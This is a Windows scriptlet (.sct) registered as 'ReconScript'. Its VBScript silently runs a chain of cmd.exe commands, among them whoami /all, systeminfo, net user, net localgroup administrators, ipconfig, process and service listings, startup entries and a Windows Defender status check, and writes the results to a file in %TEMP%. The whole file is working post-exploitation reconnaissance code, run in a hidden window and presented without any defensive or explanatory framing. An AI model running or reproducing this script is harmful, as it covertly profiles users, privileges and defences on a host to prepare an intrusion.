<?xml version="1.0" encoding="UTF-8"?>
<scriptlet>
  <registration
    progid="ReconScript"
    classid="{F0001111-0000-0000-0000-0000FEEDACDC}">
    <script language="VBScript">
      <![CDATA[
        Dim shell, cmd
        Set shell = CreateObject("WScript.Shell")

        cmd = "cmd.exe /c " & _
        "echo --- User Information--- > %TEMP%\recon.txt & " & _
        "hostname >> %TEMP%\recon.txt & " & _
        "echo. >> %TEMP%\recon.txt & " & _
        "echo --- User Details--- >> %TEMP%\recon.txt & " & _
        "whoami >> %TEMP%\recon.txt & " & _
        "whoami /all >> %TEMP%\recon.txt & " & _
        "echo --- System Info--- >> %TEMP%\recon.txt & " & _
        "systeminfo >> %TEMP%\recon.txt & " & _
        "ver >> %TEMP%\recon.txt & " & _
        "wmic logicaldisk get name >> %TEMP%\recon.txt & " & _
        "net share >> %TEMP%\recon.txt & " & _
        "net user >> %TEMP%\recon.txt & " & _
        "net localgroup >> %TEMP%\recon.txt & " & _
        "net localgroup administrators >> %TEMP%\recon.txt & " & _
        "ipconfig /all >> %TEMP%\recon.txt & " & _
        "route print >> %TEMP%\recon.txt & " & _
        "wmic process list full >> %TEMP%\recon.txt & " & _
        "sc query >> %TEMP%\recon.txt & " & _
        "wmic startup get caption,command >> %TEMP%\recon.txt & " & _
        "sc query windefend >> %TEMP%\recon.txt"

        shell.Run cmd, 0, False
      ]]>
    </script>
  </registration>
</scriptlet>
